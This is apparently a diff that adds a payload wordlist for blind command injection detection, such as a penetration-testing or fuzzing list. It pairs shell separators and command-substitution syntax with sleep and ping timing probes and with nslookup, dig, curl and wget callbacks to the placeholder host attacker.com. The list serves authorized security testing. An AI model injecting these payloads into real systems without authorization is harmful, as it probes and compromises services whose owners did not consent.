@@ -1,0 +1,26 @@
+# Command Injection - Blind Detection
+# Payloads that detect command injection via time delays or out-of-band
+# No visible output -- confirmed by response timing or DNS callbacks
+; sleep 5
+| sleep 5
+|| sleep 5
+&& sleep 5
+& sleep 5
+$(sleep 5)
+`sleep 5`
+; sleep 5 #
+| sleep 5 #
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+& ping -c 5 127.0.0.1
+; ping -n 5 127.0.0.1
+& ping -n 5 127.0.0.1
+; nslookup attacker.com
+| nslookup attacker.com
+& nslookup attacker.com
+$(nslookup attacker.com)
+`nslookup attacker.com`
+; curl http://attacker.com
+| wget http://attacker.com
+$(curl http://attacker.com)
+; dig attacker.com
